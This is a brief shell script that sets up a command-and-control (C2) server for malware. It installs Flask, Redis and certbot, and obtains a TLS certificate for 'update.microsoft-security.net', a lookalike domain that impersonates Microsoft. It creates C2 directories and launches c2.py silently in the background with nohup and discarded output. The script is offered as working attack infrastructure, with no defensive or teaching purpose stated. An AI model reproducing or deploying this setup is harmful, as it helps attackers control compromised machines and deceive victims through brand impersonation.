sudo apt update && sudo apt install python3-pip python3-venv redis-server sqlite3 certbot nginx -y
pip3 install flask gevent redis cryptography python-dotenv

# Get SSL cert
sudo certbot certonly --standalone -d update.microsoft-security.net

# Create directories
sudo mkdir -p /var/lib/c2 /var/log/c2
sudo touch /var/log/c2/server.log
sudo chown www-www-data /var/log/c2/server.log

# Copy c2.py to /opt/c2/
# Edit config: set C2_DOMAIN, CERT_FILE, KEY_FILE paths
# Run:
cd /opt/c2
nohup python3 c2.py > /dev/null 2>&1 &
